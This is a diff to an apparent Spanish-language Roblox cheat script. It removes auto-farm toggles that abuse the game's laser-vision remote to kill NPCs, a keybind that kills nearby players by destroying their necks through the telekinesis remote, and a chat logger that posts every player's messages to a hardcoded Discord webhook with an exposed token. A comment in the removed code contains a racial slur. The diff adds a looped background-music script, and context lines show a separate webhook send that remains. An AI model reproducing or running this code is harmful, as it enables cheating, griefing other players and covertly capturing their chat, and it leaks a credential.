@@ -321,78 +321,6 @@ MainSection:NewToggle("AutoFarm Orbes", "", function(state)
                 end);
         end
 end);
-MainSection:NewToggle("LaserCivililesFarm", "", function(state)
-        if state then
-                getgenv().LaserC = true;
-                coroutine.resume(coroutine.create(function()
-                        local event = game:GetService("ReplicatedStorage").Events.ToggleLaserVision;
-                        local part = event:InvokeServer(true);
-                        getgenv().LaserC = true;
-                        while LaserC and part do
-                                wait();
-                                for i, v in pairs(game.Workspace:GetChildren()) do
-                                        if ((v.ClassName == "Model") and (v.Name == "Civilian") and v:FindFirstChild("Humanoid") and (v.Humanoid.Health > 0)) then
-                                                part.Position = v.HumanoidRootPart.Position;
-                                        end
-                                end
-                        end
-                        event:InvokeServer(false);
-                end));
-        else
-                spawn(function()
-                        getgenv().LaserC = false;
-                end);
-                breakvelocity();
-        end
-end);
-MainSection:NewToggle("LaserPoliciaFarm", "", function(state)
-        if state then
-                getgenv().LaserV = true;
-                coroutine.resume(coroutine.create(function()
-                        local event = game:GetService("ReplicatedStorage").Events.ToggleLaserVision;
-                        local part = event:InvokeServer(true);
-                        getgenv().LaserV = true;
-                        while LaserV and part do
-                                for i, v in pairs(game.Workspace:GetChildren()) do
-                                        if ((v.ClassName == "Model") and (v.Name == "Police") and v:FindFirstChild("Humanoid") and (v.Humanoid.Health > 0)) then
-                                                part.Position = v.HumanoidRootPart.Position;
-                                        end
-                                end
-                                wait();
-                        end
-                        event:InvokeServer(false);
-                end));
-        else
-                spawn(function()
-                        getgenv().LaserV = false;
-                end);
-                breakvelocity();
-        end
-end);
-MainSection:NewToggle("LaserMatonesFarm", "", function(state)
-        if state then
-                getgenv().LaserH = true;
-                coroutine.resume(coroutine.create(function()
-                        local event = game:GetService("ReplicatedStorage").Events.ToggleLaserVision;
-                        local part = event:InvokeServer(true);
-                        getgenv().LaserH = true;
-                        while LaserH and part do
-                                wait();
-                                for i, v in pairs(game.Workspace:GetChildren()) do
-                                        if ((v.ClassName == "Model") and (v.Name == "Thug") and v:FindFirstChild("Humanoid") and (v.Humanoid.Health > 0)) then
-                                                part.Position = v.HumanoidRootPart.Position;
-                                        end
-                                end
-                        end
-                        event:InvokeServer(false);
-                end));
-        else
-                spawn(function()
-                        getgenv().LaserH = false;
-                end);
-                breakvelocity();
-        end
-end);
 MainSection:NewToggle("Civiles Farm", "", function(state)
         if state then
                 CivilianX = player.Character.HumanoidRootPart.Position['X'];
@@ -1115,31 +1043,6 @@ KSection:NewKeybind("LlevarJugador", "", Enum.KeyCode['H'], function()
                 end);
         end
 end);
-KSection:NewKeybind("AgarreBloqueado", "", Enum.KeyCode['T'], function()
-        spawn(function()
-                local LookVector = game.Workspace.Camera.CFrame.LookVector;
-                game:GetService("ReplicatedStorage").Events.ToggleTelekinesis:InvokeServer(LookVector, true);
-                game:GetService("ReplicatedStorage").Events.ToggleTelekinesis:InvokeServer(LookVector, false);
-        end);
-end);
-KSection:NewKeybind("TelekinesisMuerte", "", Enum.KeyCode['G'], function()
-        spawn(function()
-                getNearPlayer(99);
-                for i, v in pairs(plrlist) do
-                        if (v == player) then
-                        else
-                                spawn(function()
-                                        v.Head.Neck:Destroy();
-                                        plrlist = {};
-                                        wait(0.2);
-                                        spawn(function()
-                                                game:GetService("ReplicatedStorage").Events.ToggleTelekinesis:InvokeServer(Vector3.new(1, 1, 1), false, game.Players[v.Name].Character);
-                                        end);
-                                end);
-                        end
-                end
-        end);
-end);
 KSection:NewKeybind("LiberarAgarre", "", Enum.KeyCode['C'], function()
         plrlist = {};
         Players = game:GetService("Players");
@@ -1246,51 +1149,51 @@ local webhookData = createWebhookData()
 
 -- Sending the webhook
 sendWebhook(webhookUrl, webhookData)
-
---CAPTA NIGGAS METODO 2
+--Musica 
 -- Roblox Services
-local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local ChatService = require(game:GetService("ServerScriptService"):WaitForChild("ChatServiceRunner"):WaitForChild("ChatService"))
 
--- URL del webhook de Discord
-local webhookUrl = "https://discord.com/api/webhooks/1267182464225378404/1m2zABYatIsf8VyZmDUQoQjurfAeDYwupramxZi5GY2vsiqHo063s70N6skgP793q_5g"
+-- ID de la canción que deseas reproducir (reemplaza con el ID de tu música)
+local musicId = "14145620056" -- Cambia esto al ID de la canción que deseas reproducir
 
--- Function to send a message to the Discord webhook
-local function sendToDiscord(message)
-    local data = {
-        content = message
-    }
-    local jsonData = HttpService:JSONEncode(data)
-    local success, err = pcall(function()
-        HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
-    end)
-    if not success then
-        warn("Error sending message to Discord: " .. err)
-    else
-        print("Message sent to Discord successfully!")
+-- Función para reproducir música en el jugador
+local function playMusic(player)
+    local playerGui = player:FindFirstChild("PlayerGui")
+    if playerGui then
+        -- Verificar si ya existe un objeto Sound con el nombre "MusicSound"
+        local existingSound = playerGui:FindFirstChild("MusicSound")
+        if existingSound then
+            -- Si ya existe, solo asegúrate de que esté reproduciendo
+            if not existingSound.IsPlaying then
+                existingSound:Play()
+            end
+            return
+        end
+
+        -- Crear un objeto Sound si no existe
+        local sound = Instance.new("Sound")
+        sound.Name = "MusicSound"
+        sound.SoundId = "rbxassetid://" .. musicId
+        sound.Volume = 15
+        sound.Looped = true  -- Reproduce la música en bucle
+        sound.Parent = playerGui  -- Asegúrate de que el sonido se reproduzca en el GUI del jugador
+
+        -- Reproducir el sonido
+        sound:Play()
     end
 end
 
--- Function to handle chat messages and send them to Discord
-local function onChatMessage(message, player)
-    if player then
-        local formattedMessage = player.Name .. ": " .. message.Text
-        print("Sending message to Discord: " .. formattedMessage)
-        sendToDiscord(formattedMessage)
-    else
-        local formattedMessage = "An anonymous player: " .. message.Text
-        print("Sending anonymous message to Discord: " .. formattedMessage)
-        sendToDiscord(formattedMessage)
-    end
-end
-
--- Connect chat messages to the Discord webhook
-ChatService.OnMessageReceived = onChatMessage
-
--- Connect the function to the PlayerAdded event
+-- Ejecutar la función para el jugador que entra en el juego
 local function onPlayerAdded(player)
-    -- Optional: Additional code for when a player joins
+    player.CharacterAdded:Connect(function()
+        playMusic(player)
+    end)
+
+    -- Reproducir música inmediatamente si el jugador ya está en el juego
+    if player.Character then
+        playMusic(player)
+    end
 end
 
+-- Conectar el evento PlayerAdded
 Players.PlayerAdded:Connect(onPlayerAdded)
